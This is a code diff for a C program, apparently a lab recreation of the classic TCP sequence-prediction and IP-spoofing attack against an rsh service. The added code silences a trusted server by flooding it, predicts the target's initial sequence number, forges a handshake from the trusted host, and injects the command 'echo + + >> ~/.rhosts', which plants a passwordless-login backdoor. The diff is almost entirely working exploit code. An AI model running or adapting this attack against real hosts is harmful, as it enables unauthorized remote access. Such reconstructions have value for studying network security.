@@ -4,8 +4,8 @@
 #include "utils_libnet.h"
 #include "utils_libpcap.h"
 
-#define DISABLE_HOST "disable"
-#define ENABLE_HOST "enable"
+#define DISABLE_SERVER "disable"
+#define ENABLE_SERVER "enable"
 
 void toggleServer(char *toggle) {
   Libnet libnet = makeLibnet();
@@ -30,11 +30,11 @@ void toggleServer(char *toggle) {
   addTCPToContext(tcpOptions);
   addIPv4ToContext(ipv4Options);
 
-  if (strcmp(toggle, DISABLE_HOST) == 0) {
+  if (strcmp(toggle, DISABLE_SERVER) == 0) {
     for (int i = 0; i < 10; i++) {
       libnet_write(libnet.context);
     }
-  } else if (strcmp(toggle, ENABLE_HOST) == 0) {
+  } else if (strcmp(toggle, ENABLE_SERVER) == 0) {
     libnet_write(libnet.context);
   }
   freeLibnet(libnet);
@@ -45,7 +45,7 @@ void probeXterminal() {
   IPAddresses addresses = makeIPAddresses("172.16.24.2", "172.16.24.4");
 
   uint16_t sourcePort = 530;
-  uint16_t destinationPort = 513;
+  uint16_t destinationPort = 514;
   uint32_t sequenceNumber = 128000;
   uint32_t acknowledgementNumber = 0;
   uint32_t payloadLength = 0;
@@ -71,20 +71,21 @@ void probeXterminal() {
   addIPv4ToContext(ipv4RSTOptions);
 
   libnet_write(ACKLibnet.context);
-  usleep(2000);
+  usleep(1000);
   libnet_write(RSTLibnet.context);
 
   freeLibnet(ACKLibnet);
   freeLibnet(RSTLibnet);
 }
 
-void calculateISN() {
+uint32_t calculateISN() {
   const u_char *data = NULL;
   struct pcap_pkthdr *header = NULL;
-  uint32_t isn = 0, prevIsn = 0, difference = 0, prevDifference = 0;
-
+  uint32_t isn = 0, prevIsn = 0, difference = 0, prevDifference = 0,
+           predictedIsn = 0, differenceSquared = 0, prevDifferenceSquare = 0;
+  uint8_t match = 0;
   Pcap pcap = makePcap("tcp and src host 172.16.24.4");
-  for (size_t i = 0; i < 24; i++) {
+  while (1) {
     probeXterminal();
     pcap_next_ex(pcap.handle, &header, &data);
     Packet packet = makePacket(data);
@@ -98,14 +99,102 @@ void calculateISN() {
       prevDifference = difference;
       continue;
     }
-    printf("%d\n", prevDifference - difference);
+    differenceSquared = prevDifference - difference;
+    if (prevDifferenceSquare == 0) {
+      prevDifferenceSquare = differenceSquared;
+      continue;
+    }
+    if (differenceSquared == 1337 && prevDifferenceSquare != 1337) {
+      predictedIsn = isn - (difference - 1337);
+      if (differenceSquared == 1337 && prevDifferenceSquare == 1337) {
+        if (predictedIsn != isn) {
+          match = 0;
+        }
+      }
+      if (match > 4) {
+        printf("Predicted ISN: %u\n", predictedIsn);
+        freePcap(pcap);
+        return predictedIsn;
+      }
+      match += 1;
+    }
     prevIsn = isn;
     prevDifference = difference;
+    prevDifferenceSquare = differenceSquared;
   }
   freePcap(pcap);
+  return 0;
+}
+
+uint16_t setupBackdoor(char *buffer, char *clientUsername, char *serverUsername,
+                       char *command) {
+  uint16_t length = 0;
+  length += sprintf(buffer, "0");
+  *(buffer + length) = '\0';
+  length += 1;
+  length +=
+      snprintf(buffer + length, STRING_BUFF_SIZE / 2, "%s", clientUsername);
+  *(buffer + length) = '\0';
+  length += 1;
+  length +=
+      snprintf(buffer + length, STRING_BUFF_SIZE / 2, "%s", serverUsername);
+  *(buffer + length) = '\0';
+  length += 1;
+  length += snprintf(buffer + length, STRING_BUFF_SIZE / 2, "%s", command);
+  *(buffer + length) = '\0';
+  length += 1;
+  return length;
+}
+
+void injectPacket(uint32_t predictedIsn) {
+  Libnet handshakeLibnet = makeLibnet();
+  uint16_t payloadLength = 0, sourcePort = 513, destinationPort = 514;
+  uint32_t serverSequenceNumber = 256000, acknowledgementNumber = 0;
+  uint8_t control = TH_SYN;
+
+  IPAddresses addresses = makeIPAddresses("172.16.24.3", "172.16.24.4");
+  IPv4Options ipOptions =
+      makeIPv4TCPOptions(addresses.source, addresses.destination, payloadLength,
+                         handshakeLibnet, 0);
+  TCPOptions handshakeTcpOptions = makeTCPOptions(
+      sourcePort, destinationPort, serverSequenceNumber, acknowledgementNumber,
+      control, payloadLength, handshakeLibnet, 0);
+  // PayloadOptions payloadOptions = makePayloadOptions(backdoor, 43, libnet,
+  // 0);
+  libnet_ptag_t handshakeTcpPtag = addTCPToContext(handshakeTcpOptions);
+  addIPv4ToContext(ipOptions);
+  libnet_write(handshakeLibnet.context);
+
+  handshakeTcpOptions.acknowledgement = predictedIsn + 1;
+  handshakeTcpOptions.sequence = handshakeTcpOptions.sequence + 1;
+  handshakeTcpOptions.control = TH_ACK;
+  handshakeTcpOptions.ptag = handshakeTcpPtag;
+  addTCPToContext(handshakeTcpOptions);
+  sleep(1);
+  libnet_write(handshakeLibnet.context);
+
+  Libnet backdoorLibnet = makeLibnet();
+  char backdoor[STRING_BUFF_SIZE] = {'\0'};
+  payloadLength =
+      setupBackdoor(backdoor, "tsutomu", "tsutomu", "echo + + >> ~/.rhosts");
+  PayloadOptions backdoorPayloadOptions =
+      makePayloadOptions(backdoor, payloadLength, backdoorLibnet, 0);
+  TCPOptions backdoorTCPOptions = makeTCPOptions(
+      sourcePort, destinationPort, serverSequenceNumber + 1, predictedIsn + 1,
+      TH_ACK | TH_PUSH, payloadLength, backdoorLibnet, 0);
+  IPv4Options backdoorIpv4Options =
+      makeIPv4TCPOptions(addresses.source, addresses.destination, payloadLength,
+                         backdoorLibnet, 0);
+  addPayloadToContext(backdoorPayloadOptions);
+  addTCPToContext(backdoorTCPOptions);
+  addIPv4ToContext(backdoorIpv4Options);
+  sleep(1);
+  libnet_write(backdoorLibnet.context);
 }
 
 int main(void) {
-  calculateISN();
+  toggleServer(DISABLE_SERVER);
+  injectPacket(calculateISN());
+  toggleServer(ENABLE_SERVER);
   return 0;
 }
